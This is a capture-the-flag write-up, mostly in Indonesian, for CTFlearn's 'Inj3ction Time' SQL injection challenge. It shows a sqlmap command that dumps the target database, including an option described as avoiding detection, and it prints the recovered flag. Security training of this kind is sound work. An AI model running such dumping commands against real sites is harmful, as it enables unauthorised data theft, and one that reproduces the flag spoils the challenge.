# Inj3ction Time

---

## Challenge

I stumbled upon this website: [Link](http://web.ctflearn.com/web8/) and I think they have the flag in their somewhere. 
UNION might be a helpful command

---

## Analisis

Saat membuka halaman target, ditampilkan sebuah form input sederhana.  
  
![web.png](web.png)  
  
Setelah melakukan submit, terlihat bahwa aplikasi menggunakan **HTTP GET** dan mengirimkan parameter `id` melalui URL:

```https://web.ctflearn.com/web8/?id=test```

Hal ini menunjukkan:
  
* Input pengguna langsung diproses oleh backend
* Parameter `id` berpotensi digunakan dalam query SQL
* Tidak terlihat adanya validasi atau sanitasi input
Kondisi ini mengindikasikan kerentanan **SQL Injection**.

---

## Eksploitasi

Untuk memverifikasi dan mengeksploitasi celah tersebut, digunakan **sqlmap** dengan target parameter `id`.

```bash
sqlmap -u "https://web.ctflearn.com/web8/?id=test" \
  --dump \
  --time-sec=10 \
  --threads=1 \
  --no-cast
```

**Penjelasan opsi utama:**  
  
* `-u` URL target dengan parameter injeksi
* `--dump` mengekstrak isi database yang relevan
* `--time-sec=10` toleransi delay (antisipasi blind/time-based)
* `--threads=1` menghindari deteksi agresif
* `--no-cast` mencegah error casting pada backend database

### Hasil

Sqlmap berhasil mengekstrak data dari database dan menemukan flag berikut:

```diff
+---------------------------------+
| f0und_m3                        |
+---------------------------------+
| abctf{uni0n_1s_4_gr34t_c0mm4nd} |
+---------------------------------+
```

---

## Flag

```abctf{uni0n_1s_4_gr34t_c0mm4nd}```
